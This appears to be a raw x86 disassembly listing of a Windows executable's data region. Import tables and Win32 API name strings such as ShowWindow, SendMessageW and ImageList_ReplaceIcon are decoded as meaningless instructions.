  428133:	add    BYTE PTR [esi],cl
  428135:	adc    BYTE PTR [eax],al
  428137:	out    0x67,eax
  428139:	adc    BYTE PTR [eax],al
  42813b:	js     0x428164
  42813d:	adc    BYTE PTR [eax],al
  42813f:	test   al,0x13
  428141:	adc    BYTE PTR [eax],al
  428143:	fs push esi
  428145:	adc    BYTE PTR [eax],al
  428147:	jp     0x428169
  428149:	adc    BYTE PTR [eax],al
  42814b:	enter  0x1052,0x0
  42814f:	loop   0x4281c4
  428151:	adc    BYTE PTR [eax],al
  428153:	ja     0x4281c0
  428155:	adc    BYTE PTR [eax],al
  428157:	cmp    al,0x2b
  428159:	adc    BYTE PTR [eax],al
  42815b:	rcl    BYTE PTR [edx],1
  42815d:	adc    BYTE PTR [eax],al
  42815f:	sbb    DWORD PTR [eax+0x10],ebx
  428162:	add    BYTE PTR [esi],ah
  428164:	add    dl,BYTE PTR [eax]
  428166:	add    BYTE PTR [edi+0xc],dh
  428169:	adc    BYTE PTR [eax],al
  42816b:	mov    dh,BYTE PTR [ecx]
  42816d:	adc    BYTE PTR [eax],al
  42816f:	out    dx,al
  428170:	sbb    eax,0xed80010
  428175:	adc    BYTE PTR [eax],al
  428177:	add    eax,0x3300107f
  42817c:	jbe    0x42818e
  42817e:	add    BYTE PTR [ebx],dh
  428180:	add    DWORD PTR [edx+0x0],0x428137
  428187:	cmp    eax,DWORD PTR [ecx-0x7ec0ffbe]
  42818d:	inc    edx
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    BYTE PTR [edi-0x7f],bl
  4281ad:	inc    edx
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [ebx],cl
  4281cc:	add    BYTE PTR [edx+0x0],0xf
  4281d0:	add    BYTE PTR [edx+0x0],0x13
  4281d4:	add    BYTE PTR [edx+0x0],0x17
  4281d8:	add    BYTE PTR [edx+0x0],0x1b
  4281dc:	add    BYTE PTR [edx+0x0],0x1f
  4281e0:	add    BYTE PTR [edx+0x0],0x23
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x2b
  4281ec:	add    BYTE PTR [edx+0x0],0x2f
  4281f0:	add    BYTE PTR [edx+0x0],0x33
  4281f4:	add    BYTE PTR [edx+0x0],0x37
  4281f8:	add    BYTE PTR [edx+0x0],0x3b
  4281fc:	add    BYTE PTR [edx+0x0],0x3f
  428200:	add    BYTE PTR [edx+0x0],0x43
  428204:	add    BYTE PTR [edx+0x0],0x47
  428208:	add    BYTE PTR [edx+0x0],0x29
  42820c:	or     al,0x10
  42820e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428214:	push   edi
  428215:	adc    BYTE PTR [eax],al
  428217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428218:	outs   dx,DWORD PTR ds:[esi]
  428219:	adc    BYTE PTR [eax],al
  42821b:	push   ebx
  42821c:	popa   
  42821d:	adc    BYTE PTR [eax],al
  42821f:	add    dh,BYTE PTR [ebp+0x10]
  428222:	add    dh,cl
  428224:	jle    0x428236
  428226:	add    BYTE PTR [esi+edx*2],dl
  428229:	adc    BYTE PTR [eax],al
  42822b:	mov    al,0x68
  42822d:	adc    BYTE PTR [eax],al
  42822f:	aas    
  428230:	inc    esp
  428231:	adc    BYTE PTR [eax],al
  428233:	pop    ebp
  428234:	and    DWORD PTR [eax],edx
  428236:	add    bl,dl
  428238:	jl     0x42824a
  42823a:	add    BYTE PTR [edx+0xb],dh
  42823d:	adc    BYTE PTR [eax],al
  42823f:	inc    edx
  428240:	push   eax
  428241:	adc    BYTE PTR [eax],al
  428243:	mov    ebp,0xbb001074
  428248:	pop    ds
  428249:	adc    BYTE PTR [eax],al
  42824b:	sub    DWORD PTR [eax+0x10],eax
  42824e:	add    BYTE PTR [ecx],dh
  428250:	ja     0x428262
  428252:	add    bl,dl
  428254:	sbb    dl,BYTE PTR [eax]
  428256:	add    BYTE PTR [esi+0x1e],ch
  428259:	adc    BYTE PTR [eax],al
  42825b:	or     ch,BYTE PTR [esi]
  42825d:	adc    BYTE PTR [eax],al
  42825f:	sbb    eax,0xa100103e
  428264:	data16 adc BYTE PTR [eax],al
  428267:	xchg   ecx,eax
  428268:	bound  edx,QWORD PTR [eax]
  42826a:	add    BYTE PTR [esi],bh
  42826c:	dec    edi
  42826d:	adc    BYTE PTR [eax],al
  42826f:	in     eax,dx
  428270:	adc    BYTE PTR fs:[eax],al
  428273:	sub    bl,BYTE PTR [ecx+0x10]
  428276:	add    BYTE PTR [esi+0x43],al
  428279:	adc    BYTE PTR [eax],al
  42827b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42827f:	rol    BYTE PTR [esi+0x10],0x0
  428283:	in     eax,0x31
  428285:	adc    BYTE PTR [eax],al
  428287:	mov    esp,0x4b00104f
  42828c:	add    BYTE PTR [edx+0x0],0x4f
  428290:	add    BYTE PTR [edx+0x0],0x53
  428294:	add    BYTE PTR [edx+0x0],0x57
  428298:	add    BYTE PTR [edx+0x0],0x5b
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0x6b
  4282ac:	add    BYTE PTR [edx+0x0],0x6f
  4282b0:	add    BYTE PTR [edx+0x0],0x73
  4282b4:	add    BYTE PTR [edx+0x0],0x77
  4282b8:	add    BYTE PTR [edx+0x0],0x7b
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0xe1
  4282cc:	and    dl,BYTE PTR [eax]
  4282ce:	add    bh,bh
  4282d0:	push   ecx
  4282d1:	adc    BYTE PTR [eax],al
  4282d3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282da:	add    BYTE PTR [ebx],al
  4282dc:	sbb    dl,BYTE PTR [eax]
  4282de:	add    ch,ah
  4282e0:	or     dl,BYTE PTR [eax]
  4282e2:	add    BYTE PTR [edi+0x42001035],bl
  4282e8:	pop    edi
  4282e9:	adc    BYTE PTR [eax],al
  4282eb:	adc    eax,0xd300103f
  4282f0:	cmp    dl,BYTE PTR [eax]
  4282f2:	add    BYTE PTR [ebp+0x1001021],ah
  4282f8:	sbb    al,0x10
  4282fa:	add    BYTE PTR [ebx-0x1effefd7],ch
  428300:	adc    BYTE PTR cs:[eax],al
  428303:	push   eax
  428304:	adc    BYTE PTR [bx+si],al
  428307:	mov    edi,0xcb00102d
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xeb
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xffffff98
  42834c:	pusha  
  42834d:	adc    BYTE PTR [eax],al
  42834f:	pop    ebp
  428350:	js     0x428362
  428352:	add    BYTE PTR [esi],bh
  428354:	dec    eax
  428355:	adc    BYTE PTR [eax],al
  428357:	cmp    al,0x7a
  428359:	adc    BYTE PTR [eax],al
  42835b:	aam    0x9
  42835d:	adc    BYTE PTR [eax],al
  42835f:	or     cl,BYTE PTR [ebx]
  428361:	adc    BYTE PTR [eax],al
  428363:	pop    ebx
  428364:	push   ebp
  428365:	adc    BYTE PTR [eax],al
  428367:	mov    esi,0x6001032
  42836c:	xor    edx,DWORD PTR [eax]
  42836e:	add    BYTE PTR [esi-0x16ffefc0],al
  428374:	and    eax,0x61460010
  428379:	adc    BYTE PTR [eax],al
  42837b:	adc    DWORD PTR [ebp+0x10],ebp
  42837e:	add    al,al
  428380:	dec    esi
  428381:	adc    BYTE PTR [eax],al
  428383:	jae    0x4283a3
  428385:	adc    BYTE PTR [eax],al
  428387:	dec    ebx
  428388:	add    eax,0x834b0010
  42838d:	inc    edx
  42838e:	add    BYTE PTR [edi-0x7d],cl
  428391:	inc    edx
  428392:	add    BYTE PTR [ebx-0x7d],dl
  428395:	inc    edx
  428396:	add    BYTE PTR [edi-0x7d],dl
  428399:	inc    edx
  42839a:	add    BYTE PTR [ebx-0x7d],bl
  42839d:	inc    edx
  42839e:	add    BYTE PTR [edi-0x7d],bl
  4283a1:	inc    edx
  4283a2:	add    BYTE PTR [ebx-0x7d],ah
  4283a5:	inc    edx
  4283a6:	add    BYTE PTR [edi-0x7d],ah
  4283a9:	inc    edx
  4283aa:	add    BYTE PTR [ebx-0x7d],ch
  4283ad:	inc    edx
  4283ae:	add    BYTE PTR [edi-0x7d],ch
  4283b1:	inc    edx
  4283b2:	add    BYTE PTR [ebx-0x7d],dh
  4283b5:	inc    edx
  4283b6:	add    BYTE PTR [edi-0x7d],dh
  4283b9:	inc    edx
  4283ba:	add    BYTE PTR [ebx-0x7d],bh
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283d4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283d7:	dec    edi
  4283d8:	add    BYTE PTR [eax],al
  4283da:	add    BYTE PTR [eax],al
  4283dc:	xor    BYTE PTR [ebp+0x10002],cl
  4283e2:	add    BYTE PTR [eax],al
  4283e4:	add    DWORD PTR [eax],eax
  4283e6:	add    BYTE PTR [eax],al
  4283e8:	add    DWORD PTR [eax],eax
  4283ea:	add    BYTE PTR [eax],al
  4283ec:	add    BYTE PTR [ebp-0x72dffffe],cl
  4283f2:	add    al,BYTE PTR [eax]
  4283f4:	adc    BYTE PTR [ebp+0x2],cl
	...
  428402:	add    BYTE PTR [eax],al
  428404:	enter  0x285,0x0
  428408:	in     al,0x85
  42840a:	add    al,BYTE PTR [eax]
  42840c:	test   BYTE PTR [ebp-0x79f7fffe],0x2
  428413:	add    BYTE PTR [eax],ah
  428415:	xchg   BYTE PTR [edx],al
  428417:	add    BYTE PTR [esi+eax*4],dh
  42841a:	add    al,BYTE PTR [eax]
  42841c:	dec    esi
  42841d:	xchg   BYTE PTR [edx],al
  42841f:	add    BYTE PTR [eax],al
  428421:	add    BYTE PTR [eax],al
  428423:	add    BYTE PTR [eax-0x7a],dh
  428426:	add    al,BYTE PTR [eax]
  428428:	mov    es,WORD PTR [esi-0x7963fffe]
  42842e:	add    al,BYTE PTR [eax]
  428430:	stos   BYTE PTR es:[edi],al
  428431:	xchg   BYTE PTR [edx],al
  428433:	add    BYTE PTR [esi-0x33fffd7a],bh
  428439:	xchg   BYTE PTR [edx],al
  42843b:	add    dh,bl
  42843d:	xchg   BYTE PTR [edx],al
  42843f:	add    al,dh
  428441:	xchg   BYTE PTR [edx],al
  428443:	add    dh,bh
  428445:	xchg   BYTE PTR [edx],al
  428447:	add    BYTE PTR [eax],dl
  428449:	xchg   DWORD PTR [edx],eax
  42844b:	add    BYTE PTR [edx],ah
  42844d:	xchg   DWORD PTR [edx],eax
  42844f:	add    BYTE PTR [eax],dh
  428451:	xchg   DWORD PTR [edx],eax
  428453:	add    BYTE PTR [esi],bh
  428455:	xchg   DWORD PTR [edx],eax
  428457:	add    BYTE PTR [eax-0x79],dl
  42845a:	add    al,BYTE PTR [eax]
  42845c:	pop    esp
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    BYTE PTR [edx-0x79],dh
  428462:	add    al,BYTE PTR [eax]
  428464:	test   BYTE PTR [edi-0x7869fffe],al
  42846a:	add    al,BYTE PTR [eax]
  42846c:	mov    ds:0xb2000287,al
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    dl,al
  428475:	xchg   DWORD PTR [edx],eax
  428477:	add    al,bl
  428479:	xchg   DWORD PTR [edx],eax
  42847b:	add    ah,ah
  42847d:	xchg   DWORD PTR [edx],eax
  42847f:	add    dh,dh
  428481:	xchg   DWORD PTR [edx],eax
  428483:	add    BYTE PTR [eax+ecx*4],cl
  428486:	add    al,BYTE PTR [eax]
  428488:	push   ds
  428489:	mov    BYTE PTR [edx],al
  42848b:	add    BYTE PTR [eax+ecx*4],ch
  42848e:	add    al,BYTE PTR [eax]
  428490:	cmp    al,0x88
  428492:	add    al,BYTE PTR [eax]
  428494:	dec    esi
  428495:	mov    BYTE PTR [edx],al
  428497:	add    BYTE PTR [edx-0x78],ah
  42849a:	add    al,BYTE PTR [eax]
  42849c:	js     0x428426
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	mov    cl,BYTE PTR [eax-0x7763fffe]
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	lods   al,BYTE PTR ds:[esi]
  4284a9:	mov    BYTE PTR [edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  4284b2:	add    al,BYTE PTR [eax]
  4284b4:	fimul  WORD PTR [eax-0x7713fffe]
  4284ba:	add    al,BYTE PTR [eax]
  4284bc:	cli    
  4284bd:	mov    BYTE PTR [edx],al
  4284bf:	add    BYTE PTR [edx],dl
  4284c1:	mov    DWORD PTR [edx],eax
  4284c3:	add    BYTE PTR [ecx+ecx*4],ah
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	mov    DWORD PTR ss:[edx],eax
  4284cb:	add    BYTE PTR [edx-0x77],al
  4284ce:	add    al,BYTE PTR [eax]
  4284d0:	dec    esi
  4284d1:	mov    DWORD PTR [edx],eax
  4284d3:	add    BYTE PTR [edx-0x77],bl
  4284d6:	add    al,BYTE PTR [eax]
  4284d8:	push   0xffffff89
  4284da:	add    al,BYTE PTR [eax]
  4284dc:	or     BYTE PTR [ecx-0x7671fffe],0x2
  4284e3:	add    BYTE PTR [eax-0x4dfffd77],ah
  4284e9:	mov    DWORD PTR [edx],eax
  4284eb:	add    BYTE PTR [eax],al
  4284ed:	add    BYTE PTR [eax],al
  4284ef:	add    ah,cl
  4284f1:	mov    DWORD PTR [edx],eax
  4284f3:	add    BYTE PTR [eax],al
  4284f5:	add    BYTE PTR [eax],al
  4284f7:	add    dl,ch
  4284f9:	mov    DWORD PTR [edx],eax
  4284fb:	add    ah,bh
  4284fd:	mov    DWORD PTR [edx],eax
  4284ff:	add    BYTE PTR [esi],cl
  428501:	mov    al,BYTE PTR [edx]
  428503:	add    BYTE PTR [edx+ecx*4],ah
  428506:	add    al,BYTE PTR [eax]
  428508:	mov    al,BYTE PTR ss:[edx]
  42850b:	add    BYTE PTR [eax-0x76],cl
  42850e:	add    al,BYTE PTR [eax]
  428510:	pop    eax
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    BYTE PTR [esi-0x76],dh
  428516:	add    al,BYTE PTR [eax]
  428518:	xchg   BYTE PTR [edx-0x756bfffe],cl
  42851e:	add    al,BYTE PTR [eax]
  428520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428521:	mov    al,BYTE PTR [edx]
  428523:	add    BYTE PTR [edx-0x3dfffd76],dh
  428529:	mov    al,BYTE PTR [edx]
  42852b:	add    dh,cl
  42852d:	mov    al,BYTE PTR [edx]
  42852f:	add    al,ah
  428531:	mov    al,BYTE PTR [edx]
  428533:	add    dl,dh
  428535:	mov    al,BYTE PTR [edx]
  428537:	add    BYTE PTR [eax],cl
  428539:	mov    eax,DWORD PTR [edx]
  42853b:	add    BYTE PTR [esi],dl
  42853d:	mov    eax,DWORD PTR [edx]
  42853f:	add    BYTE PTR [edx],ah
  428541:	mov    eax,DWORD PTR [edx]
  428543:	add    BYTE PTR [ebx+ecx*4],bh
  428546:	add    al,BYTE PTR [eax]
  428548:	push   esp
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  42854f:	add    BYTE PTR [edx-0x75],bh
  428552:	add    al,BYTE PTR [eax]
  428554:	xchg   BYTE PTR [ebx-0x7467fffe],cl
  42855a:	add    al,BYTE PTR [eax]
  42855c:	add    BYTE PTR [eax],al
  42855e:	add    BYTE PTR [eax],al
  428560:	mov    eax,0xc200028b
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    al,dl
  428569:	mov    eax,DWORD PTR [edx]
  42856b:	add    ah,bl
  42856d:	mov    eax,DWORD PTR [edx]
  42856f:	add    ah,ch
  428571:	mov    eax,DWORD PTR [edx]
  428573:	add    dl,bh
  428575:	mov    eax,DWORD PTR [edx]
  428577:	add    BYTE PTR [esi],al
  428579:	mov    WORD PTR [edx],es
  42857b:	add    BYTE PTR [eax],dl
  42857d:	mov    WORD PTR [edx],es
  42857f:	add    BYTE PTR [edx],ah
  428581:	mov    WORD PTR [edx],es
  428583:	add    BYTE PTR [eax],bh
  428585:	mov    WORD PTR [edx],es
  428587:	add    BYTE PTR [esi-0x74],cl
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    WORD PTR fs:[edx],es
  42858f:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428593:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  42859a:	add    al,BYTE PTR [eax]
  42859c:	mov    ds:0xba00028c,al
  4285a1:	mov    WORD PTR [edx],es
  4285a3:	add    ah,al
  4285a5:	mov    WORD PTR [edx],es
  4285a7:	add    al,dl
  4285a9:	mov    WORD PTR [edx],es
  4285ab:	add    dh,bl
  4285ad:	mov    WORD PTR [edx],es
	...
  4285bf:	add    BYTE PTR [ebx+0x6d],ah
  4285c2:	fs cs gs js 0x42862c
  4285c7:	add    BYTE PTR [edi],dl
  4285c9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285cd:	je     0x428641
  4285cf:	outs   dx,DWORD PTR ds:[esi]
  4285d0:	jns    0x428622
  4285d2:	jb     0x428643
  4285d4:	jo     0x42863b
  4285d6:	jb     0x42864c
  4285d8:	jns    0x42862d
  4285da:	push   0x50746565
  4285df:	popa   
  4285e0:	add    BYTE PTR gs:[bx+si],al
  4285e4:	pop    esp
  4285e5:	add    BYTE PTR [eax+0x72],dl
  4285e8:	outs   dx,DWORD PTR ds:[esi]
  4285e9:	jo     0x428650
  4285eb:	jb     0x428661
  4285ed:	jns    0x428642
  4285ef:	push   0x57746565
  4285f4:	add    BYTE PTR [eax],al
  4285f6:	pop    ebx
  4285f7:	add    BYTE PTR [eax+0x72],dl
  4285fa:	outs   dx,DWORD PTR ds:[esi]
  4285fb:	jo     0x428662
  4285fd:	jb     0x428673
  4285ff:	jns    0x428654
  428601:	push   0x41746565
  428606:	add    BYTE PTR [eax],al
  428608:	dec    esi
  428609:	add    BYTE PTR [ecx+0x6d],cl
  42860c:	popa   
  42860d:	addr16 gs dec esp
  428610:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428617:	ins    BYTE PTR es:[edi],dx
  428618:	popa   
  428619:	arpl   WORD PTR [ebp+0x49],sp
  42861c:	arpl   WORD PTR [edi+0x6e],bp
  42861f:	add    BYTE PTR [ecx],dh
  428621:	add    BYTE PTR [ecx+0x6d],cl
  428624:	popa   
  428625:	addr16 gs dec esp
  428628:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42862f:	je     0x4286a3
  428631:	outs   dx,DWORD PTR ds:[esi]
  428632:	jns    0x428634
  428634:	inc    eax
  428635:	add    BYTE PTR [ecx+0x6d],cl
  428638:	popa   
  428639:	addr16 gs dec esp
  42863c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428643:	dec    ecx
  428644:	ins    DWORD PTR es:[edi],dx
  428645:	popa   
  428646:	addr16 gs inc ebx
  428649:	outs   dx,DWORD PTR ds:[esi]
  42864a:	jne    0x4286ba
  42864c:	je     0x42864e
  42864e:	dec    esp
  42864f:	add    BYTE PTR [ecx+0x6d],cl
  428652:	popa   
  428653:	addr16 gs dec esp
  428656:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42865d:	outs   dx,DWORD PTR ds:[esi]
  42865e:	jbe    0x4286c5
  428660:	add    BYTE PTR [eax],al
  428662:	inc    ebx
  428663:	dec    edi
  428664:	dec    ebp
  428665:	inc    ebx
  428666:	push   esp
  428667:	dec    esp
  428668:	xor    esi,DWORD PTR [edx]
  42866a:	cs fs ins BYTE PTR es:[edi],dx
  42866d:	ins    BYTE PTR es:[edi],dx
  42866e:	add    BYTE PTR [eax],al
  428670:	push   edi
  428671:	add    BYTE PTR [ebx+0x72],al
  428674:	gs popa 
  428676:	je     0x4286dd
  428678:	inc    esp
  428679:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428680:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428688:	jb     0x4286eb
  42868a:	ins    DWORD PTR es:[edi],dx
  42868b:	push   edi
  42868c:	add    BYTE PTR [eax],al
  42868e:	xor    al,BYTE PTR [edx]
  428690:	push   ebx
  428691:	gs je  0x4286d7
  428694:	popa   
  428695:	jb     0x4286fc
  428697:	je     0x4286e9
  428699:	outs   dx,DWORD PTR ds:[esi]
  42869a:	jae    0x42869c
  42869c:	cmp    al,BYTE PTR [ecx]
  42869e:	inc    edi
  42869f:	gs je  0x4286ef
  4286a2:	gs jae 0x428718
  4286a5:	popa   
  4286a6:	addr16 gs inc ecx
  4286a9:	add    BYTE PTR [edx+0x61724400],dh
  4286af:	ja     0x4286f7
  4286b1:	jb     0x428714
  4286b3:	ins    DWORD PTR es:[edi],dx
  4286b4:	gs inc ebx
  4286b6:	outs   dx,DWORD PTR ds:[esi]
  4286b7:	outs   dx,BYTE PTR ds:[esi]
  4286b8:	je     0x42872c
  4286ba:	outs   dx,DWORD PTR ds:[esi]
  4286bb:	ins    BYTE PTR es:[edi],dx
  4286bc:	add    BYTE PTR [eax],al
  4286be:	sbb    BYTE PTR [ecx],al
  4286c0:	inc    edi
  4286c1:	gs je  0x42870d
  4286c4:	arpl   WORD PTR [edi+0x6e],bp
  4286c7:	dec    ecx
  4286c8:	outs   dx,BYTE PTR ds:[esi]
  4286c9:	outs   dx,WORD PTR ds:[esi]
  4286cb:	add    bl,bh
  4286cd:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286d1:	arpl   WORD PTR [ebx+0x50],bp
  4286d4:	outs   dx,DWORD PTR ds:[esi]
  4286d5:	jo     0x42874c
  4286d7:	jo     0x428726
  4286d9:	outs   dx,BYTE PTR gs:[esi]
  4286db:	jne    0x4286dd
  4286dd:	add    cl,bl
  4286df:	add    DWORD PTR [ebp+0x6f],ecx
  4286e2:	outs   dx,BYTE PTR ds:[esi]
  4286e3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286eb:	push   edx
  4286ec:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  4286f1:	add    BYTE PTR [ebx+0x68],al
  4286f4:	popa   
  4286f5:	jb     0x42874c
  4286f7:	jo     0x428769
  4286f9:	gs jb  0x428753
  4286fc:	add    BYTE PTR [eax],al
  4286fe:	add    dl,BYTE PTR ds:[ebx+0x65]
  428702:	je     0x428748
  428704:	ins    BYTE PTR es:[edi],dx
  428705:	addr16 dec ecx
  428707:	je     0x42876e
  428709:	ins    DWORD PTR es:[edi],dx
  42870a:	push   esp
  42870b:	gs js  0x428782
  42870e:	inc    ecx
  42870f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428713:	push   0x774f776f
  428718:	outs   dx,BYTE PTR ds:[esi]
  428719:	gs fs push eax
  42871c:	outs   dx,DWORD PTR ds:[esi]
  42871d:	jo     0x428794
  42871f:	jo     0x428794
  428721:	add    BYTE PTR [eax],bl
  428723:	add    dl,BYTE PTR [edx+0x65]
  428726:	ins    DWORD PTR es:[edi],dx
  428727:	outs   dx,DWORD PTR ds:[esi]
  428728:	jbe    0x42878f
  42872a:	push   eax
  42872b:	jb     0x42879c
  42872d:	jo     0x428786
  42872f:	add    BYTE PTR [edi+0x2],bh
  428732:	push   ebx
  428733:	push   0x6957776f
  428738:	outs   dx,BYTE PTR ds:[esi]
  428739:	outs   dx,DWORD PTR fs:[esi]
  42873b:	ja     0x42873d
  42873d:	add    BYTE PTR [ebx],bl
  42873f:	add    BYTE PTR [ebx+0x61],al
  428742:	ins    BYTE PTR es:[edi],dx
  428743:	ins    BYTE PTR es:[edi],dx
  428744:	push   edi
  428745:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42874c:	outs   dx,DWORD PTR ds:[esi]
  42874d:	arpl   WORD PTR [edi+0x0],dx
  428750:	mov    dh,0x1
  428752:	dec    esp
  428753:	outs   dx,DWORD PTR ds:[esi]
  428754:	popa   
  428755:	fs dec ebp
  428757:	outs   dx,BYTE PTR gs:[esi]
  428759:	jne    0x42879c
  42875b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428762:	arpl   WORD PTR [eax+0x54],bp
  428765:	outs   dx,DWORD PTR ds:[esi]
  428766:	push   esp
  428767:	push   0x69577369
  42876c:	outs   dx,BYTE PTR ds:[esi]
  42876d:	outs   dx,DWORD PTR fs:[esi]
  42876f:	ja     0x428771
  428771:	add    BYTE PTR [eax],ah
  428773:	add    dl,BYTE PTR [ebx+0x63]
  428776:	jb     0x4287e7
  428778:	ins    BYTE PTR es:[edi],dx
  428779:	ins    BYTE PTR es:[edi],dx
  42877a:	push   edi
  42877b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428782:	add    BYTE PTR [eax],al
  428784:	pop    DWORD PTR [eax]
  428786:	inc    esp
  428787:	gs push di
  42878a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428791:	outs   dx,DWORD PTR ds:[esi]
  428792:	arpl   WORD PTR [edi+0x0],dx
  428795:	add    BYTE PTR [ecx],dh
  428797:	add    BYTE PTR [ebx+0x68],al
  42879a:	popa   
  42879b:	jb     0x4287ed
  42879d:	jb     0x428804
  42879f:	jbe    0x4287f8
  4287a1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287a8:	fs popa 
  4287aa:	je     0x428811
  4287ac:	push   edx
  4287ad:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287b2:	xor    eax,DWORD PTR [ecx]
  4287b4:	inc    edi
  4287b5:	gs je  0x428805
  4287b8:	outs   dx,BYTE PTR gs:[esi]
  4287ba:	jne    0x428805
  4287bc:	je     0x428823
  4287be:	ins    DWORD PTR es:[edi],dx
  4287bf:	dec    ecx
  4287c0:	inc    esp
  4287c1:	add    BYTE PTR ds:0x6e655302,ch
  4287c7:	fs dec esi
  4287c9:	outs   dx,DWORD PTR ds:[esi]
  4287ca:	je     0x428835
  4287cc:	data16 jns 0x42881c
  4287cf:	gs jae 0x428845
  4287d2:	popa   
  4287d3:	addr16 gs push edi
  4287d6:	add    BYTE PTR [eax],al
  4287d8:	mov    al,0x1
  4287da:	dec    esp
  4287db:	outs   dx,DWORD PTR ds:[esi]
  4287dc:	popa   
  4287dd:	fs dec ecx
  4287df:	arpl   WORD PTR [edi+0x6e],bp
  4287e2:	push   edi
  4287e3:	add    BYTE PTR [ecx+0x57734901],ah
  4287e9:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  4287f0:	popa   
  4287f1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  4287f5:	add    BYTE PTR ds:0x74654701,dl
  4287fb:	inc    esi
  4287fc:	outs   dx,DWORD PTR ds:[esi]
  4287fd:	jb     0x428864
  4287ff:	addr16 jb 0x428871
  428802:	jne    0x428872
  428804:	fs push edi
  428806:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42880d:	add    DWORD PTR [edi+0x65],eax
  428810:	je     0x428869
  428812:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428819:	js     0x42888f
  42881b:	inc    ecx
  42881c:	add    BYTE PTR [eax],al
  42881e:	add    DWORD PTR ds:[edi+0x65],eax
  428822:	je     0x428871
  428824:	gs jae 0x42889a
  428827:	popa   
  428828:	addr16 gs push edi
  42882b:	add    BYTE PTR [ebx],ch
  42882d:	add    dl,BYTE PTR [ebx+0x65]
  428830:	outs   dx,BYTE PTR ds:[esi]
  428831:	fs dec ebp
  428833:	gs jae 0x4288a9
  428836:	popa   
  428837:	addr16 gs push edi
  42883a:	add    BYTE PTR [eax],al
  42883c:	das    
